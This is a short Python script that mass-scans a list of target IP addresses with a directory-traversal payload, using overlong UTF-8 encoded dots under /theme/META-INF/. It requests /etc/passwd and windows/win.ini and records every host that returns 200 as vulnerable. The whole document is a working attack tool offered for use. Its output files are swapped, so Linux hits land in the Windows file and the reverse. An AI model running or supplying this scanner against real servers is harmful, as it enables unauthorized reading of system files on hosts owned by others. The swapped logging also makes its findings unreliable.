import os
import requests

payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
paload_win = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

for ip in open('ip_target_liat.txt'):
    ip = ip.replace('\n','')
    try:
        statcode_linux = requests.get(ip + payload_linux).status_code
        statcode_win = requests.get(ip + paload_win).status_code
        print("checking ->"+ip)
        if statcode_linux == 200:
            with open(r'vuln_windows.txt','a+') as f:
                f.write(ip)
                f.close()
        if statcode_win == 200:
            with open(r'vuln_Linux.txt','a+') as f:
                f.write(ip)
                f.close()
    except Exception as e:
        pass